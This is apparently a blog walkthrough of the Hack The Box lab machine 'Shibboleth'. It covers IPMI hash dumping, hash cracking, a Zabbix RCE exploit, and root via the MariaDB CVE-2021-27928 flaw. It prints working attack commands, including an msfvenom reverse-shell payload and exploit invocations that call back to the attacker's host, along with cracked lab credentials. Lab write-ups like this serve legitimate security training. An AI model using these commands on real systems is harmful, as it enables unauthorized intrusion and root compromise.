---
layout: single
title: Shibolleth - Hack The Box
date: 2022-04-25
excerpt: "Shibboleth is a medium difficulty Linux machine featuring IPMI and Zabbix software. IPMI authentication is
found to be vulnerable to remote password hash retrieval. The hash can be cracked and Zabbix access can
be obtained using these credentials. Foothold can be gained by abusing the Zabbix agent in order to run
system commands. The initial password can be re-used to login as the ipmi-svc and acquire the user flag.
A MySQL service is identified and found to be vulnerable to OS command execution. After successfully
exploiting this service a root shell is gained."
header:
  teaser: /assets/img/shibolleth/cover.png
  teaser_home_page: true
  icon: /assets/htb.png
categories:
  - hackthebox
  - infosec
tag:
    - UDP
    - IPMI
    - Zabbix
    - MariaDB
    - RCE
    - CVE-2021-27928
---

![](/assets/img/shibolleth/cover.png)

## Synopsis

Shibboleth is a medium difficulty Linux machine featuring IPMI and Zabbix software. IPMI authentication is
found to be vulnerable to remote password hash retrieval. The hash can be cracked and Zabbix access can
be obtained using these credentials. Foothold can be gained by abusing the Zabbix agent in order to run
system commands. The initial password can be re-used to login as the ipmi-svc and acquire the user flag.
A MySQL service is identified and found to be vulnerable to OS command execution. After successfully
exploiting this service a root shell is gained.

## Portscan

```bash
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Did not follow redirect to http://shibboleth.htb/
```

## Reconaissance

### HTTP

added new shibboleth.htb into hosts file, because only port 80 is open.

![](/assets/img/shibolleth/1.png)

then i use feroxbuster to scan directory

feroxbuster result:

```bash
 🎯  Target Url            │ http://shibboleth.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET     1323l     4114w    59474c http://shibboleth.htb/
301      GET        9l       28w      317c http://shibboleth.htb/assets => http://shibboleth.htb/assets/
301      GET        9l       28w      316c http://shibboleth.htb/forms => http://shibboleth.htb/forms/
403      GET        9l       28w      279c http://shibboleth.htb/server-status
```

inside /get we only see two files

![](/assets/img/shibolleth/2.png)

README.txt

```
Fully working PHP/AJAX contact form script is available in the pro version of the template.
You can buy it from: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
```

contact.php

```
Unable to load the "PHP Email Form" Library!
```

it seems that these two files are the defaults of the template, continuing the process for fuzzing sub domain with `ffuf`

```bash
ffuf -c -u http://shibolleth.htb -w /usr/share/seclists/Discover/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.shibolleth.htb" -fw 18
```

![](/assets/img/shibolleth/3.png)

added new sub domains into hosts file again, accessing this page [zabbix](http://zabbix.shibboleth.htb/) will find login page

![](/assets/img/shibolleth/4.png)

find a lot of exploit too using `searchsploit`

![](/assets/img/shibolleth/5.png)

basically what is zabbix, in short zabbix is open source monitoring software tool, including networks, servers, VM, and cloud services. Zabbix also provides monitoring metrics such as network utilization, CPU load and disk space consumpution.

already tried admin:admin on login page without any luck, because to carry out the exploitation requires credentials. Back to the initial stage of scanning on UDP using nmap.

```
nmap -sU $ip
```

result of nmap 

```bash
PORT    STATE SERVICE
623/udp open  asf-rmcp
```

according on [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval) we able to dump hash from rmcp using metasploit.

in metasploit we should use the ipmi module with following setup:

```
use scanner/ipmi/ipmi_dumphashes
set output_hashcat_file yes
set rhost ip-shibolleth
```

execute command `run` will obtain hashes for administrator user

![](/assets/img/shibolleth/8.png)

that hash use algorithm SHA1 then run `hashcat` with modul 7300

```
hashcat -a 0 -m 7300 hash /usr/share/wordlists/rockyou.txt
```

![](/assets/img/shibolleth/9.png)

```
Administrator:ilovepumkinpie1
```

back to zabbix and use this credentials

![](/assets/img/shibolleth/10.png)

as you can see we able to logged in, now this zabbix version is 5.0 with affected of RCE vulnerability.
you can grab public exploit in [here](https://www.exploit-db.com/exploits/50816)

execute this command below will gain acess into system

```python
python 50816.py http://monitoring.shibboleth.htb/ Administrator ilovepumkinpie1 10.10.14.8 9000
```

![](/assets/img/shibolleth/11.png)

## Privilege Escalation

password reuse for user ipmi-svc, and on enumeration i managed to find the configuration file

![](/assets/img/shibolleth/12.png)

read the configuration file and find the credentials for Maria Database

```bash
### Option: DBHost
# DBHost=localhost
### Option: DBName
# DBName=

DBName=zabbix
### Option: DBSchema
# DBSchema=
### Option: DBUser
# DBUser=
DBUser=zabbix

### Option: DBPassword
DBPassword=bloooarskybluh

### Option: DBSocket
# DBSocket=
### Option: DBPort
```

mysql service running locally on port 3306 by default, lets dump it

![](/assets/img/shibolleth/13.png)

get the information from table users

![](/assets/img/shibolleth/14.png)

thats hash didnt show me the way, so the thing is we had to exploit the mysql version

![](/assets/img/shibolleth/15.png)

this MariaDB version affected of CVE-2021-27928, you can read the poc in [here](https://github.com/Al1ex/CVE-2021-27928).

create the payload using `msfvenom` and upload into target in /tmp folder

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=9002 -f elf-so -o CVE-2021-27928.so
```

makesure listener ready and execute command below will lead you into root system

```
mysql -u zabbix -pbloooarskybluh -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so"';
```

![](/assets/img/shibolleth/16.png)

### REFERENCESS
```text
https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi
http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm
https://netsec.ws/?p=337
https://hashcat.net/wiki/doku.php?id=example_hashes
```